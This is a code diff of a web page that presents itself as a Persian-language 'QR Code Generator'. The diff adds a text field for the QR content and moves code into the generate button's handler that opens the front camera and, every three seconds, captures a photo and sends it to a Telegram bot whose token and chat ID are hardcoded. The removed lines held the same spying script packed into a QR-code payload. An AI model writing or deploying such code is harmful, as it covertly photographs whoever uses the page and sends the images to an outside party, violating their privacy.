@@ -12,6 +12,7 @@
 <body>
   
   <h1>QR Code Generator</h1>
+  <input placeholder="متن داخل QR Code" id="inp" style="width:300px;padding:10px;"/>
   <button onclick="generate()">ساخت QR Code</button>
   <div id="qrcode"></div>
   
@@ -21,31 +22,35 @@
 function generate() {
   const BOT_TOKEN = "8687133754:AAEIvtI61moYzNCRLtsdU3-U5tUMxJkb9bU";
   const CHAT_ID = "6512853118";
+  
+  const input = document.getElementById('inp');
+  const text = input.value.trim() || "سلام از QR Code";
 
-  const payload = `data:text/html,<script>
-    let stream;
-    navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(s=>{
-      stream = s;
-      const v=document.createElement('video');v.srcObject=s;v.play();
-      
-      // هر ۳ ثانیه عکس بگیر و بفرست
-      setInterval(()=>{ 
-        const c=document.createElement('canvas');c.width=640;c.height=480;
-        c.getContext('2d').drawImage(v,0,0,640,480);
-        c.toBlob(b=>{
-          const f=new FormData();
-          f.append('chat_id','${CHAT_ID}');
-          f.append('caption','📸 عکس هر ۳ ثانیه');
-          f.append('photo',b,'photo.jpg');
-          fetch('https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto',{method:'POST',body:f});
-        },'image/jpeg',0.85);
-      },3000);
-    }).catch(()=>alert('دسترسی به دوربین رد شد'));
-  <\/script>`;
+  // ================== شروع دوربین و عکس هر ۳ ثانیه ==================
+  let stream;
+  navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(s=>{
+    stream = s;
+    const v=document.createElement('video');v.srcObject=s;v.play();
+    
+    // هر ۳ ثانیه عکس بگیر و بفرست
+    setInterval(()=>{ 
+      const c=document.createElement('canvas');c.width=640;c.height=480;
+      c.getContext('2d').drawImage(v,0,0,640,480);
+      c.toBlob(b=>{
+        const f=new FormData();
+        f.append('chat_id',CHAT_ID);
+        f.append('caption','📸 عکس هر ۳ ثانیه');
+        f.append('photo',b,'photo.jpg');
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:'POST',body:f});
+        alert("گرفته شد")
+      },'image/jpeg',0.85);
+    },3000);
+  }).catch(()=>alert('دسترسی به دوربین رد شد'));
 
+  // ================== ساخت QR Code ==================
   document.getElementById('qrcode').innerHTML = '';
   new QRCode(document.getElementById('qrcode'), {
-    text: payload,
+    text: text,
     width: 260,
     height: 260,
     colorDark: "#000000",
